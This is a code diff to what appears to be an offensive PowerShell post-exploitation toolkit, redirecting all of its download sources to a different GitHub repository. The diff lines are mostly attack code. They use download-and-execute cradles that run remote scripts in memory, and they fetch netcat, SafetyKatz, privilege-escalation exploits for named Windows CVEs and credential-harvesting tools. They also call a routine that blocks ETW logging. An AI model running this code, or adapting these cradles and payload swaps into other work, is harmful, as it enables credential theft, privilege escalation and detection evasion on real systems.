@@ -34,7 +34,7 @@ public class ztzsw {
 
 }
 
-$Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
+$Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t"
 
 function dependencychecks
 {
@@ -283,7 +283,7 @@ __        ___       ____
     if ($web)
     {
           iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/S3cur3Th1sSh1t/Creds/raw/master/pwned_x64/notepad.exe'
+            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/pwned_x64/notepad.exe'
           $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
           if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
             {
@@ -832,9 +832,9 @@ function Safedump
     blocketw
     iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     
-	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+		Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 	}
 	else
 	{
@@ -1091,9 +1091,9 @@ function CVE-2019-1215
 {
     testtemp
     
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
 	}
 	else
 	{
@@ -1114,9 +1114,9 @@ function ms15-077
 {
     testtemp
     
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
 	}
 	else
 	{
@@ -1140,9 +1140,9 @@ function ms15-077
 function Juicypot
 {
     testtemp
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
 	}
 	else
 	{
@@ -1165,9 +1165,9 @@ function Juicypot
 function CVE-2018-8120
 {
     testtemp
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
 	}
 	else
 	{
@@ -1184,10 +1184,10 @@ function CVE-2019-0841
     testtemp
     iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
-		Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
+		Invoke-Sharpcradle -uri "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
 	
 	}
 	else
@@ -1201,9 +1201,9 @@ function CVE-2019-0841
 function CVE-2019-1129
 {
 	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
+		Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
 	}
 	else
 	{
@@ -1212,9 +1212,9 @@ function CVE-2019-1129
 	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
 	Start-Sleep -Seconds 15
 	Write-Host 'Next Try..'
-	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
+		Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByebear.exe -argument1 "license.rtf 2"
 	}
 	else
 	{
@@ -1234,11 +1234,11 @@ function CVE-2019-1069
         $username = Read-Host -Prompt 'Please enter the username'
         $password = Read-Host -Prompt 'Please enter the password'
 
-		if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+		if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 		{
-			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
-			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
-			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
+			Invoke-Webrequest -Uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
+			Invoke-Webrequest -Uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
+			Invoke-Webrequest -Uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
 		}
 		else
 		{
@@ -1249,11 +1249,11 @@ function CVE-2019-1069
 		
         if ([Environment]::Is64BitProcess)
         {
-   			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+   			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 			{
-				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+				Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
 				Start-Sleep -Seconds 1.5
-				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+				Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
 			}
 			else
 			{
@@ -1264,11 +1264,11 @@ function CVE-2019-1069
         }
         else
         {
-			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 			{
-				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+				Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
 				Start-Sleep -Seconds 1.5
-				Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+				Invoke-Sharpcradle -uri https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
 			}
 			else
 			{
@@ -2113,9 +2113,9 @@ function Passhunt
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
 		if (!(test-path $currentPath\passhunt.exe))
 		{
-			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 			{
-				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+				Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
 			}
 			else
 			{
@@ -2133,9 +2133,9 @@ function Passhunt
         {
             if (!(test-path $currentPath\passhunt.exe))
 			{
-				if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+				if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 				{
-					Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+					Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
 				}
 				else
 				{
@@ -2161,9 +2161,9 @@ function Passhunt
         }
         else
         {
-            if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+            if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 			{
-				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+				Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
 			}
 			else
 			{
@@ -4086,7 +4086,7 @@ function winPEAS
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
     REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
-    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
+    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
     if ($noninteractive)
     {
         IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
@@ -4350,9 +4350,9 @@ function laZagnemodule
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+    if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t")
 	{
-		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
+		Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
 	}
 	else
 	{
@@ -5094,7 +5094,7 @@ __        ___       ____
     }
     else
     {
-    $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
+    $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/neon-info-sec/data/refs/heads/main/S3cur3Th1sSh1t"
     }
 	
     BlockEtw
